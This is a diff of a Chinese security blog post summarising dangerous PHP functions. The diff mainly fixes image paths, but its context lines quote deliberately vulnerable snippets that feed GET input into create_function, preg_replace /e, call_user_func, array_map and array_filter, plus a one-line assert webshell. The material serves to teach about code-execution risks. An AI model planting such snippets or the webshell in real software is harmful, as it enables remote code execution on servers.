@@ -128,6 +128,7 @@
 <meta property="og:description" content="php危险函数总结什么是危险函数​    函数设计出来就是让人使用的，之所以危险，是因为其功能过于强大。开发人员特别是刚从业的人员很少很少会完整阅读整个文档，再或者是没有意识到当给这些函数传递一些非常规的，外部可控的参数会带来什么影响。 1234567$_GET            $POST$_fILES$_COOKIE$_REQUEST		$_SERVER		$_SESSION  执行任意代">
 <meta property="og:image" content="https://shu1l.github.io/2020/04/02/php-wei-xian-han-shu-zong-jie/QQ%E6%88%AA%E5%9B%BE20200218123543.png">
 <meta property="og:image" content="https://shu1l.github.io/2020/04/02/php-wei-xian-han-shu-zong-jie/QQ%E6%88%AA%E5%9B%BE20200218125837.png">
+<meta property="og:image" content="https://shu1l.github.io/2020/04/02/php-wei-xian-han-shu-zong-jie/QQ%E6%88%AA%E5%9B%BE20200218130741.png">
 <meta property="og:image" content="https://shu1l.github.io/2020/04/02/php-wei-xian-han-shu-zong-jie/QQ%E6%88%AA%E5%9B%BE20200218130753.png">
 <meta property="og:image" content="https://shu1l.github.io/2020/04/02/php-wei-xian-han-shu-zong-jie/QQ%E6%88%AA%E5%9B%BE20200218131820.png">
 <meta property="og:image" content="https://shu1l.github.io/2020/04/02/php-wei-xian-han-shu-zong-jie/QQ%E6%88%AA%E5%9B%BE20200218133234.png">
@@ -470,7 +471,7 @@
 <p>功能：根据传递的参数创建匿名函数，并为其返回唯一名称。</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"><span class="php">$id=$_GET[<span class="string">'id'</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="php">$str2=<span class="string">'echo'</span>.$a.<span class="string">'"test"'</span>.$id.<span class="string">";"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$f1 = create_function(<span class="string">'$a'</span>, $str2);</span></span><br><span class="line"></span><br><span class="line"><span class="php">$f1(<span class="string">"abc"</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
 
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200218123543.png" alt=""></p>
+<p><img src="/2020/04/02/php-wei-xian-han-shu-zong-jie/QQ%E6%88%AA%E5%9B%BE20200218123543.png" alt></p>
 <h5 id="preg-replace函数"><a href="#preg-replace函数" class="headerlink" title="preg_replace函数"></a>preg_replace函数</h5><p>preg_replace($pattern,$replacement,$subject,$limit,$count)</p>
 <p>示例1：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">preg_replace(<span class="string">"/test/e"</span>, $_GET[<span class="string">"a"</span>], <span class="string">"this is a test"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
@@ -480,26 +481,26 @@
 <p>示例2：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="string">"/\s*\[php\](.+?)\[\/php\]\s*/ies"</span>, <span class="string">'test("\1")'</span>, $_GET[<span class="string">"h"</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200218125837.png" alt=""></p>
+<p><img src="/2020/04/02/php-wei-xian-han-shu-zong-jie/QQ%E6%88%AA%E5%9B%BE20200218125837.png" alt></p>
 <h5 id="call-user-func-call-user-func-array函数"><a href="#call-user-func-call-user-func-array函数" class="headerlink" title="call_user_func/call_user_func_array函数"></a>call_user_func/call_user_func_array函数</h5><p>call_user_func($callback,$parameter)</p>
 <p>调用一个回调函数处理字符串,</p>
 <p>call_user_func_array($callback,$param arr)</p>
 <p>利用回调函数处理数组。</p>
 <p><strong>示例1：</strong></p>
-<img src=QQ截图20200218130741.png />
+<img src="/2020/04/02/php-wei-xian-han-shu-zong-jie/QQ截图20200218130741.png">
 
-<img src="QQ截图20200218130753.png" style="zoom:67%;" />
+<img src="/2020/04/02/php-wei-xian-han-shu-zong-jie/QQ截图20200218130753.png" style="zoom:67%;">
 
 <p><strong>示例2：</strong></p>
 <p>一句话木马：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@call_user_func(<span class="string">"assert"</span>,$_GET[<span class="string">'cmd'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200218131820.png" alt=""></p>
+<p><img src="/2020/04/02/php-wei-xian-han-shu-zong-jie/QQ%E6%88%AA%E5%9B%BE20200218131820.png" alt></p>
 <h5 id="array-map函数"><a href="#array-map函数" class="headerlink" title="array_map函数"></a>array_map函数</h5><p>array_map（$callback,$array1)</p>
 <p>​    作用是为数组的每个元素应用回调函数 。其返回值为数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$func=$_GET[<span class="string">"func"</span>];</span><br><span class="line"></span><br><span class="line">$cmd=$_GET[<span class="string">'cmd'</span>];</span><br><span class="line"></span><br><span class="line">$array[<span class="number">0</span>]=$cmd;</span><br><span class="line"></span><br><span class="line">$new_array=array_map($func,$array);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
- <img src="QQ截图20200218133234.png"  />
+ <img src="/2020/04/02/php-wei-xian-han-shu-zong-jie/QQ截图20200218133234.png">
 
 
 
@@ -508,7 +509,7 @@
 <p>语法：array array_filter ( array $array [, callable $callback [, int $flag = 0 ]] )</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cmd=$_GET[<span class="string">'cmd'</span>];</span><br><span class="line"></span><br><span class="line">$array1=<span class="keyword">array</span>($cmd);</span><br><span class="line"></span><br><span class="line">$func=$_GET[<span class="string">'func'</span>];</span><br><span class="line"></span><br><span class="line">array_filter($array1,$func);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<img src="QQ截图20200218202542.png" style="zoom:67%;" />
+<img src="/2020/04/02/php-wei-xian-han-shu-zong-jie/QQ截图20200218202542.png" style="zoom:67%;">
 
 <h5 id="usort-uasort函数"><a href="#usort-uasort函数" class="headerlink" title="usort/uasort函数"></a>usort/uasort函数</h5><p><strong>usort</strong></p>
 <p>使用用户自定义的比较函数对数组中的值进行排序 </p>
@@ -737,7 +738,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">64</span>
+                  <span class="site-state-item-count">66</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
